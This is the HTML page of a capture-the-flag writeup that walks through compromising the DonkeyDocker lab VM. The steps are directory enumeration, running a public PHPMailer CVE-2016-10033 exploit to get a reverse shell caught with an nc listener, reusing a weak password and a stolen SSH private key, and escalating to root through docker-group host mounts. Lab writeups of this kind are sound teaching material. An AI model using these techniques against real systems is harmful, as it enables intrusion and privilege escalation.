@@ -1,0 +1,783 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Donkey Docker - Core dump overflow</title>
+  <meta name="author" content="chousensha">
+
+  
+  
+  <meta name="description" content="Donkey Docker writeup">
+  <meta name="keywords" content="donkey docker, pentest lab, vulnhub, ctf, boot2root, docker, phpmailer">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://chousensha.github.io/blog/2019/04/15/donkey-docker">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-51216602-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Core dump overflow</a></h1>
+  
+    <h2>Core dump in progress...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:chousensha.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/where-to-start">Where to start</a></li>
+  <li><a href="/book-corner">Book corner</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Donkey Docker</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2019-04-15T21:02:36+03:00" pubdate data-updated="true">Apr 15<span>th</span>, 2019</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://chousensha.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Today&rsquo;s target is called DonkeyDocker, so we should expect a Docker component! The level is intermediate to hard.</p>
+
+<!-- more -->
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
+</span><span class='line'>| ssh-hostkey:
+</span><span class='line'>|   2048 9c:38:ce:11:9c:b2:7a:48:58:c9:76:d5:b8:bd:bd:57 (RSA)
+</span><span class='line'>|   256 d7:5e:f2:17:bd:18:1b:9c:8c:ab:11:09:e8:a0:00:c2 (ECDSA)
+</span><span class='line'>|_  256 06:f0:0c:d8:bc:9b:21:95:a5:d2:70:39:08:57:b3:07 (ED25519)
+</span><span class='line'>80/tcp open  http    Apache httpd 2.4.10 ((Debian))
+</span><span class='line'>| http-robots.txt: 3 disallowed entries
+</span><span class='line'>|_/contact.php /index.php /about.php
+</span><span class='line'>|_http-server-header: Apache/2.4.10 (Debian)
+</span><span class='line'>|_http-title: Docker Donkey</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Not much to work with, let&rsquo;s hit the web server first. Nothing interesting on the home page and the contact page d, but going to the about page gives an error that something went wrong.</p>
+
+<p>In the HTML source, I found a comment:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!-- FIXME!: www-path: /www --&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Didn&rsquo;t find such a path with my enumeration. I fired up Gobuster next:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>gobuster -u http://192.168.159.132/ -w /usr/share/wordlists/dirb/big.txt -q -t 20
+</span><span class='line'>/.htpasswd (Status: 403)
+</span><span class='line'>/.htaccess (Status: 403)
+</span><span class='line'>/about (Status: 200)
+</span><span class='line'>/assets (Status: 301)
+</span><span class='line'>/contact (Status: 200)
+</span><span class='line'>/css (Status: 301)
+</span><span class='line'>/dist (Status: 301)
+</span><span class='line'>/index (Status: 200)
+</span><span class='line'>/mailer (Status: 301)
+</span><span class='line'>/robots.txt (Status: 200)
+</span><span class='line'>/server-status (Status: 403)
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Trying those folders gave me 403 errors, so the next thing I did was to enumerate those folders themselves, and got an interesting hit with the /mailer folder:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>gobuster -u http://192.168.159.132/mailer -w /usr/share/wordlists/dirb/big.txt -q -t 20
+</span><span class='line'>/.htpasswd (Status: 403)
+</span><span class='line'>/.htaccess (Status: 403)
+</span><span class='line'>/LICENSE (Status: 200)
+</span><span class='line'>/docs (Status: 301)
+</span><span class='line'>/examples (Status: 301)
+</span><span class='line'>/extras (Status: 301)
+</span><span class='line'>/language (Status: 301)
+</span><span class='line'>/test (Status: 301)
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Going to /mailer/examples/ reveals a PHPMailer installation. From the Github files, it should also have a VERSION file, so I went to <a href="http://192.168.159.132/mailer/VERSION">http://192.168.159.132/mailer/VERSION</a> and was rewarded with the version number: 5.2.16. I found a Metasploit exploit:</p>
+
+<blockquote><p>PHPMailer versions up to and including 5.2.19 are affected by a
+ vulnerability which can be leveraged by an attacker to write a file
+ with partially controlled contents to an arbitrary location through
+ injection of arguments that are passed to the sendmail binary. This
+ module writes a payload to the web root of the webserver before then
+ executing it with an HTTP request. The user running PHPMailer must
+ have write access to the specified WEB_ROOT directory and successful
+ exploitation can take a few minutes.</p></blockquote>
+
+<p>This one didn&rsquo;t work for me, so I found another one with <a href="https://www.exploit-db.com/exploits/40974">searchsploit</a>. To make it work, I had to install requests_toolbelt and delete the banner that was giving an encoding error. Inside the code I changed the IP and port in the payload and added the target URL:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">target</span> <span class="o">=</span> <span class="s">&#39;http://192.168.159.132/contact&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Per the <a href="https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html">advisory</a>:</p>
+
+<blockquote><p>To exploit the vulnerability an attacker could target common website
+components such as contact/feedback forms, registration forms, password
+email resets and others that send out emails with the help of a vulnerable
+version of the PHPMailer class.</p></blockquote>
+
+<p>After finishing the modifications, I ran it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com
+</span><span class='line'>Version 1.0 - github.com/anarcoder - greetings opsxcq & David Golunski
+</span><span class='line'>
+</span><span class='line'>[+] SeNdiNG eVIl SHeLL To TaRGeT....
+</span><span class='line'>[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With a listener on, I went to <a href="http://192.168.159.132/backdoor">http://192.168.159.132/backdoor</a> and got a reverse shell:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 9000
+</span><span class='line'>listening on [any] 9000 ...
+</span><span class='line'>connect to [192.168.159.129] from (UNKNOWN) [192.168.159.132] 50930
+</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
+</span><span class='line'>$ python -c 'import pty; pty.spawn("/bin/bash")'
+</span><span class='line'>www-data@12081bd067cc:/www$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From the hostname, we seem to be inside a Docker container. In the root directory I found a script:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@12081bd067cc:/www$ cat /main.sh
+</span><span class='line'>cat /main.sh
+</span><span class='line'>#!/bin/bash
+</span><span class='line'>
+</span><span class='line'># change permission
+</span><span class='line'>chown smith:users /home/smith/flag.txt
+</span><span class='line'>
+</span><span class='line'># Start apache
+</span><span class='line'>source /etc/apache2/envvars
+</span><span class='line'>a2enmod rewrite
+</span><span class='line'>apachectl -f /etc/apache2/apache2.conf
+</span><span class='line'>
+</span><span class='line'>sleep 3
+</span><span class='line'>tail -f /var/log/apache2/*&
+</span><span class='line'>
+</span><span class='line'># Start our fake smtp server
+</span><span class='line'>python -m smtpd -n -c DebuggingServer localhost:25</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Interesting, there is a flag available for user smith. I switched to this user and tried the password smith and it worked:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>smith@12081bd067cc:~$ ls -al
+</span><span class='line'>ls -al
+</span><span class='line'>total 28
+</span><span class='line'>drwx------ 1 smith users 4096 Mar 26  2017 .
+</span><span class='line'>drwxr-xr-x 1 root  root  4096 Mar 26  2017 ..
+</span><span class='line'>-rw-r--r-- 1 smith users  220 Nov  5  2016 .bash_logout
+</span><span class='line'>-rw-r--r-- 1 smith users 3515 Nov  5  2016 .bashrc
+</span><span class='line'>-rw-r--r-- 1 smith users  675 Nov  5  2016 .profile
+</span><span class='line'>drwx--S--- 2 smith users 4096 Mar 22  2017 .ssh
+</span><span class='line'>-rw-r--r-- 1 smith users  237 Mar 22  2017 flag.txt
+</span><span class='line'>smith@12081bd067cc:~$ cat flag.txt
+</span><span class='line'>cat flag.txt
+</span><span class='line'>This is not the end, sorry dude. Look deeper!
+</span><span class='line'>I know nobody created a user into a docker
+</span><span class='line'>container but who cares? ;-)
+</span><span class='line'>
+</span><span class='line'>But good work!
+</span><span class='line'>Here a flag for you: flag0{9fe3ed7d67635868567e290c6a490f8e}
+</span><span class='line'>
+</span><span class='line'>PS: I like 1984 written by George ORWELL</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Inside smith&rsquo;s home we also have a .ssh folder. Inside we have a pair of private-public keys.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>-rwx------ 1 smith users  411 Mar 22  2017 id_ed25519
+</span><span class='line'>-rwx------ 1 smith users  101 Mar 22  2017 id_ed25519.pub
+</span><span class='line'>smith@12081bd067cc:~/.ssh$ cat id_ed25519.pub
+</span><span class='line'>cat id_ed25519.pub
+</span><span class='line'>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEBBzcffpLILgXqY77+z7/Awsovz/jkhOd/0fDjvEof orwell@donkeydocker</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And the SSH user is orwell. So let&rsquo;s copy the private key to our machine and try to SSH in as orwell:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ssh -i id_ed25519 orwell@192.168.159.132
+</span><span class='line'>Welcome to
+</span><span class='line'>
+</span><span class='line'>  ___           _            ___          _
+</span><span class='line'> |   \ ___ _ _ | |_____ _  _|   \ ___  __| |_____ _ _
+</span><span class='line'> | |) / _ \ ' \| / / -_) || | |) / _ \/ _| / / -_) '_|
+</span><span class='line'> |___/\___/_||_|_\_\___|\_, |___/\___/\__|_\_\___|_|
+</span><span class='line'>                        |__/
+</span><span class='line'>                             Made with &lt;3 v.1.0 - 2017
+</span><span class='line'>
+</span><span class='line'>This is my first boot2root - CTF VM. I hope you enjoy it.
+</span><span class='line'>if you run into any issue you can find me on Twitter: @dhn_
+</span><span class='line'>or feel free to write me a mail to:
+</span><span class='line'>
+</span><span class='line'> - Email: dhn@zer0-day.pw
+</span><span class='line'> - GPG key: 0x2641123C
+</span><span class='line'> - GPG fingerprint: 4E3444A11BB780F84B58E8ABA8DD99472641123C
+</span><span class='line'>
+</span><span class='line'>Level:       I think the level of this boot2root challange
+</span><span class='line'>             is hard or intermediate.
+</span><span class='line'>
+</span><span class='line'>Try harder!: If you are confused or frustrated don't forget
+</span><span class='line'>             that enumeration is the key!
+</span><span class='line'>
+</span><span class='line'>Thanks:      Special thanks to @1nternaut for the awesome
+</span><span class='line'>             CTF VM name!
+</span><span class='line'>
+</span><span class='line'>Feedback:    This is my first boot2root - CTF VM, please
+</span><span class='line'>             give me feedback on how to improve!
+</span><span class='line'>
+</span><span class='line'>Looking forward to the write-ups!
+</span><span class='line'>
+</span><span class='line'>donkeydocker:~$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It worked! In orwell&rsquo;s home we find another flag:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ ls -al /home/orwell
+</span><span class='line'>total 24
+</span><span class='line'>drwxr-sr-x    3 orwell   orwell        4096 Mar 26  2017 .
+</span><span class='line'>drwxr-xr-x    3 root     root          4096 Mar 22  2017 ..
+</span><span class='line'>-rw-r--r--    1 root     orwell           1 Mar 26  2017 .ash
+</span><span class='line'>-rw-------    1 orwell   orwell          45 Apr 15 18:12 .ash_history
+</span><span class='line'>drwx--S---    2 orwell   users         4096 Mar 22  2017 .ssh
+</span><span class='line'>-rw-r--r--    1 orwell   orwell         104 Mar 22  2017 flag.txt
+</span><span class='line'>donkeydocker:~$ cat flag.txt
+</span><span class='line'>You tried harder! Good work ;-)
+</span><span class='line'>
+</span><span class='line'>Here a flag for your effort: flag01{e20523853d6733721071c2a4e95c9c60}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we seem to be on the Docker host itself. Let&rsquo;s confirm:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ docker ps
+</span><span class='line'>CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
+</span><span class='line'>12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 4 hours          0.0.0.0:80-&gt;80/tcp   donkeydocker</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can see the container we were in previously. Now, for the next step, I used as reference this blog post about <a href="https://fosterelli.co/privilege-escalation-via-docker.html">Docker privilege escalation</a>. The highlights are :</p>
+
+<blockquote><p>If you happen to have gotten access to a user-account on a machine, and that user is a member of the ‘docker’ group, running the following command will give you a root shell:
+docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</p>
+
+<p>The command you run to perform the privilege escalation fetches my Docker image from the Docker Hub Registry and runs it. The -v parameter that you pass to Docker specifies
+that you want to create a volume in the Docker instance. The -i and -t parameters put Docker into ‘shell mode’ rather than starting a daemon process.</p>
+
+<p>The instance is set up to mount the root filesystem of the host machine to the instance’s volume, so when the instance starts it immediately loads a chroot into that volume.
+This effectively gives you root on the machine.</p></blockquote>
+
+<p>And if we look at the groups that orwell is a part of, we can see that he is indeed a member of the docker group:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ id
+</span><span class='line'>uid=1000(orwell) gid=1000(orwell) groups=101(docker),1000(orwell)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let&rsquo;s look at the available containers now:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ docker container ls
+</span><span class='line'>CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
+</span><span class='line'>12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 32 minutes       0.0.0.0:80-&gt;80/tcp   donkeydocker</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can create a new container in the background which is based on the donkeydocker one and mount the host filesystem in it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ docker run -d -v /:/host donkeydocker
+</span><span class='line'>103cd9c625b0cf04e1ed173d95e56724051a708300a07d75c20618472eefe863</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we should find the host / contents in the /host directory inside the container. Let&rsquo;s verify that it was created:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ docker container ls
+</span><span class='line'>CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
+</span><span class='line'>103cd9c625b0        donkeydocker        "/main.sh default"   4 seconds ago       Up 3 seconds        80/tcp               epic_lovelace
+</span><span class='line'>12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 34 minutes       0.0.0.0:80-&gt;80/tcp   donkeydocker</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And now we can run a root shell inside the container and read the host flag:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ docker exec -i -t 103cd9c625b0 /bin/bash
+</span><span class='line'>root@103cd9c625b0:/# ls /host/root
+</span><span class='line'>donkeydocker  flag.txt
+</span><span class='line'>root@103cd9c625b0:/# cat /host/root/flag.txt
+</span><span class='line'>YES!! You did it :-). Congratulations!
+</span><span class='line'>
+</span><span class='line'>I hope you enjoyed this CTF VM.
+</span><span class='line'>
+</span><span class='line'>Drop me a line on twitter @dhn_, or via email dhn@zer0-day.pw
+</span><span class='line'>
+</span><span class='line'>Here is your flag: flag2{60d14feef575bacf5fd8eb06ec7cd8e7}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nice Docker twist on this VM! To recap the steps:</p>
+
+<ul>
+<li>Web directory enumeration revealed a vulnerable PHPMailer installation that gave a shell as the www-data</li>
+<li>the shell was inside a docker container. A script placed in the root filesystem revealed a smith user that had the username as password</li>
+<li>the smith user had the SSH keys for a user orwell on the host and we were able to SSH directly as that user with the private key</li>
+<li>user orwell was member of the docker group and it was possible to escalate privileges by mounting the root filesystem inside a container</li>
+</ul>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>______________________________________
+</span><span class='line'>/ Your motives for doing whatever good \
+</span><span class='line'>| deed you may have in mind will be    |
+</span><span class='line'>\ misinterpreted by somebody.          /
+</span><span class='line'> --------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2019-04-15T21:02:36+03:00" pubdate data-updated="true">Apr 15<span>th</span>, 2019</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2019/04/15/donkey-docker/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2019/04/15/donkey-docker/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2019/04/07/hackfest-2016-orcus/" title="Previous Post: Hackfest 2016 Orcus">&laquo; Hackfest 2016 Orcus</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>whoami</h1>
+  <p>switch (interests){<br>
+ case INFORMATION SECURITY:<br>
+Mostly offensive security, but trying to be well-rounded in everything;<br>
+case PYTHON:<br>
+Mainly security and sysadmin related scripting;<br>
+case LINUX:<br>
+Greetings from /dev/null;<br>
+case JAPANESE:<br>
+Language, anime, samurai;<br>
+case MARTIAL ARTS:<br>
+If it's fighting I like it;<br>
+case MILITARY SCIENCE:<br>
+Ancient, medieval, modern;<br>
+default: GAMING;}</p>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2019/04/15/donkey-docker/">Donkey Docker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2019/04/07/hackfest-2016-orcus/">Hackfest 2016 Orcus</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2019/04/02/goldeneye-007/">GoldenEye 007</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/12/27/my-oswp-review/">My OSWP review</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/11/30/getting-in-the-w1r3s/">Getting in the W1R3S</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'chousensha',
+            count: 5,
+            skip_forks: true,
+	    skip_repos: [ "chousensha.github.io" ],
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
+    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
